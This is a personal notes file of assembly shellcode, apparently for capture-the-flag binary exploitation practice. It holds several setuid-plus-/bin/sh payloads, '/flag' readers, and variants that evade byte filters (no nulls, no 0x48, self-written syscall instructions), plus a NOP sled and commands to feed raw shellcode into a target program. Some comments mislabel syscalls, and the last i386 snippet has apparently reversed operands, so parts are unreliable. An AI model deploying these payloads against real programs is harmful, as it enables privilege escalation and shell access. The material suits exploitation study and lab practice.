# SIMPLE BIN SH 
```s
.global _start
_start:
.intel_syntax noprefix

push 0 #006a
pop rdi #5f
push 105 #696a
pop rax #58
syscall #050f


mov rax, 59 #0xc748
lea rdi, [rip+binsh] #0x8d48	
mov rsi, 0	#0xc748
mov rdx, 0	#0xc748
syscall	#0x050f	
binsh:
.string "/bin/sh"
```

# READ FILE
```s
.global _start
_start:
.intel_syntax noprefix
mov rbx, 0x00000067616c662f	# push "/flag" filename
push rbx
mov rax, 2				# syscall number of open
mov rdi, rsp				# point the first argument at stack (where we have "/flag")
mov rsi, 0				# NULL out the second argument (meaning, O_RDONLY)
syscall				# trigger open("/flag", NULL)
mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax				# second argument is the file descriptor returned by open
mov rdx, 0				# third argument is the number of bytes to skip from the input file
mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
mov rax, 40				# syscall number of sendfile
syscall				# trigger sendfile(1, fd, 0, 1000)
mov rax, 60				# syscall number of exit
syscall				# trigger exit()
```

# RUN WITH PROMPT
+ gcc -nostdlib -static shellcode.s -o shellcode-elf
+ objcopy --dump-section .text=shellcode-raw shellcode-elf
+ (cat shellcode-raw; cat) | ./blah


# SH WITH NO LONG (R)SI(0x48)
```s
.global _start
_start:
.intel_syntax noprefix
#int3
add eax, 59             # this is the syscall number of execve
lea edi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
xor esi, esi            # this makes the second argument, argv, NULL
xor edx, edx            # this makes the third argument, envp, NULL
syscall                 # this triggers the system call
binsh:                          # a label marking where the /bin/sh string is
.string "/bin/sh"
```

# FLAG READ WITH NO LONG (R)SI(0x48)
```s
.global _start
_start:
.intel_syntax noprefix
#int3
lea edi, [rip+flag]    
mov eax, 2                              
mov esi, 0                             
syscall
mov edi, 1                              
mov esi, eax                            
mov edx, 0                              
mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file
mov eax, 40                             # syscall number of sendfile
syscall                         # trigger sendfile(1, fd, 0, 1000)
mov eax, 60                             # syscall number of exit
syscall                         # trigger exit()
flag:
.string "/flag"
```

# FLAG READ WITHOUT NULL
```s
.global _start
_start:
.intel_syntax noprefix
#int3
push 0x616C662F
push 0x67
pop rcx
mov [rsp+4], ecx
lea rdi, [rsp]
xor rsi, rsi
xor rax, rax
inc rax
inc rax
syscall

mov rbx, rax

lea rsi, [rsp]
mov rdi, rbx
push 0x7f
pop rdx
xor rax, rax
syscall

lea rsi, [rsp]
xor rdi, rdi
inc rdi
mov rdx, rax
xor rax, rax
inc rax
syscall

push 60
pop rax
syscall
```

# FLAG WITH NO SYSCALL
```s
.global _start
_start:
.intel_syntax noprefix
#int3
lea edi, [rip+flag]    # points the first argument of execve at the /bin/sh string below
mov esi, 0                              # NULL out the second argument (meaning, O_RDONLY)

#int3
push 0xc3050e
pop rax
inc rax
push rax
mov rax, 2             # this is the syscall number of execve
call rsp
#syscall
mov edi, 1                              # first argument to sendfile is the file descriptor to output to (stdout)
mov esi, eax                            # second argument is the file descriptor returned by open
mov edx, 0                              # third argument is the number of bytes to skip from the input file
mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file

push 0xc3050e
pop rax
inc rax
push rax
mov rax, 40             # this is the syscall number of execve
call rsp
#syscall                         # trigger sendfile(1, fd, 0, 1000)
push 0xc3050e
pop rax
inc rax
push rax
mov rax, 60             # this is the syscall number of execve
call rsp
#syscall                         # trigger exit()
flag:
.string "/flag"
```


# NEW GIT 
+ git remote set-url origin https://littlefoot22:********@github.com/littlefoot22/ctf-public.git


#
```s

.global _start
_start:
.intel_syntax noprefix
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rax, 59             # this is the syscall number of execve
lea rdi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
mov rsi, 0              # this makes the second argument, argv, NULL
mov rdx, 0              # this makes the third argument, envp, NULL
syscall                 # this triggers the system call
binsh:                          # a label marking where the /bin/sh string is
.string "/bin/sh"
```

# SHELL CODE BUBLE SORT
```s
push 0
pop rdi
push 105
pop rax
syscall


mov rax, 59
lea rdi, [rip+binsh]
pop rsi

mov rsi, 0
mov rdx, 0
syscall
stc
stc

binsh:
.string "/bin/sh"
```


 
# setuid(0)
push   0x17
pop    eax
xor    ebx,ebx
int    0x80


# /bin/sh
push   0xb
pop    eax
cltd   
push   edx
push   0x68732f2f
push   0x6e69622f
mov    esp, ebx
push   edx
push   ebx
mov    esp, ecx
int    0x80